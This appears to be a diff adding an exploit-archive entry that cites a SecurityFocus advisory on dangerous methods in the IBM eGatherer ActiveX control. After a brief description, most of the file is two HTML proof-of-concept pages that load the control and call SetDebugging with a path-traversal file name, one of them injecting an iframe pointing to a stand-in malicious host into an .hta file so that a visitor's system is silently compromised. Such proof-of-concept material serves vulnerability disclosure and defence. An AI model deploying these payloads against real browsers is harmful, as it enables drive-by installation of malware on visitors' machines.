@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/10562/info
+
+It is reported that the IBM eGatherer ActiveX control contains dangerous methods that may result in a remote compromise of a system on which the ActiveX control is installed. These methods may be accessed by a malicious website and may result in the silent installation of a malicious executable.
+
+A remote attacker may exploit this vulnerability in order to silently install a malicious executable on an affected system.
+
+-----------EXAMPLE HTML 1 ---------
+//first this page would be viewed, then through refreshing or whatever
+one goes to the second page (or just timing the two calls with
+SetTimeOUt and putting them on the same page...)
+|object classid="clsid:74FFE28D-2378-11D5-990C-006094235084" id="X"|
+|object|
+
+|script|
+X.SetDebugging("/../xx.hta",-1);
+|script|
+---------------------------------
+
+-----------EXAMPLE HTML 2 ---------
+|object classid="clsid:74FFE28D-2378-11D5-990C-006094235084" id="X"|
+|object|
+
+|script|
+X.SetDebugging("/../x<iframe src=http://www.malware.com>x.hta",-1);
+|script|
+
+
+---------------------------------
